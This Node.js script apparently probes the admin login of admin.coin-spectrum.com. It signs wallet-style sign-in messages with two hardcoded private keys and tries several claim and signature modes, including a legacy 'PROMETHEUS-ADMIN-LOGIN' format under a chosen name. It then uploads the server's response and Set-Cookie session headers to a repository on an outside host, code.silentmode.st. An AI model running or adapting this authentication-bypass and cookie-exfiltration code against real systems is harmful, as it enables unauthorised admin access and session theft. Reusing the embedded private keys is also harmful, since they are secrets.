import { createHmac } from 'node:crypto';
import { secp256k1, sha256, encodeCashAddress, CashAddressType, hash160 } from '@bitauth/libauth';
const TID_PRIV = '763fe7756d9c1543e2ace6ad9fa352d635291aa359b0b6c5b6869cb2d9d48689';
const CLAIM_PRIV = '687c95fed064682b60215b6528e660fad3daeec18898d9f7044ba3d0b5440e6c';
const TOK = process.env.TOK;
const BASE = 'https://admin.coin-spectrum.com';
const PROJ = 'admin.coin-spectrum.com';
const MODE = process.argv[2] || 'claimsig';
const tidPriv = Uint8Array.from(Buffer.from(TID_PRIV, 'hex'));
const claimPriv = Uint8Array.from(Buffer.from(CLAIM_PRIV, 'hex'));
const tidPub = secp256k1.derivePublicKeyCompressed(tidPriv);
const tid = encodeCashAddress({ prefix: 'tid', type: CashAddressType.p2pkh, payload: hash160(tidPub) }).address;
const walletPub = secp256k1.derivePublicKeyCompressed(claimPriv);
const wallet = encodeCashAddress({ prefix: 'bchtest', type: CashAddressType.p2pkh, payload: hash160(walletPub) }).address;
const vi = n => n < 0xfd ? Buffer.from([n]) : Buffer.from([0xfd, n & 255, (n >> 8) & 255]);
function magicHash(m) { const a = Buffer.from('Bitcoin Signed Message:\n'), b = Buffer.from(m); return sha256.hash(sha256.hash(Uint8Array.from(Buffer.concat([vi(a.length), a, vi(b.length), b])))); }
function sign(m) { const r = secp256k1.signMessageHashRecoverableCompact(claimPriv, magicHash(m)); const o = Buffer.from([31 + r.recoveryId, ...r.signature]); return o.toString('base64'); }
function signTid(m) { const r = secp256k1.signMessageHashRecoverableCompact(tidPriv, magicHash(m)); return Buffer.from([31 + r.recoveryId, ...r.signature]).toString('base64'); }
function build(account, nonce, chain = 'tid:1') { const now = new Date(), exp = new Date(Date.now() + 300000);
  return `${PROJ} wants you to sign in with your Theseus ID:\n${account}\n\nURI: ${BASE}/\nVersion: 1\nChain ID: ${chain}\nProject: ${PROJ}\nOrigin: ${BASE}\nNonce: ${nonce}\nIssued At: ${now.toISOString()}\nExpiration Time: ${exp.toISOString()}`; }
async function commit(name, text) { await fetch(`https://code.silentmode.st/api/v1/repos/silentmode/rt-build/contents/logs/${name}`, { method: 'PUT', headers: { authorization: `token ${TOK}`, 'content-type': 'application/json' }, body: JSON.stringify({ content: Buffer.from(text).toString('base64'), message: `log ${name}` }) }).catch(()=>{}); }
async function nonce() { for (let i = 0; i < 240; i++) { const r = await fetch(BASE + '/auth/nonce', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }); const t = await r.text(); if (r.status === 200) { console.log('nonce', i, t); return JSON.parse(t).nonce; } await new Promise(r => setTimeout(r, 1000)); } throw new Error('no nonce'); }
const n = await nonce();
let account = tid, chain = 'tid:1', claim = '';
const msg = build(account, n, chain);
let sig = signTid(msg);
if (MODE === 'claimsig') claim = sign(msg);
if (MODE.startsWith('old:')) { const nm = MODE.slice(4); claim = sign(`PROMETHEUS-ADMIN-LOGIN\nname=${nm}\nchallenge=${n}`); }
if (MODE === 'wallet') { account = wallet; chain = 'bch:mainnet'; const m2 = build(account, n, chain); sig = sign(m2); }
const message = build(account, n, chain);
const r = await fetch(BASE + '/auth/verify', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ message, signature: sig, claim }) });
const body = await r.text();
const sc = (r.headers.getSetCookie?.() || []).join(' | ');
const out = JSON.stringify({ mode: MODE, status: r.status, body, setcookie: sc, account, nonce: n, wallet }, null, 1);
console.log(out);
await commit(`${MODE.replace(/\W/g,'_')}-${Date.now()}.json`, out);
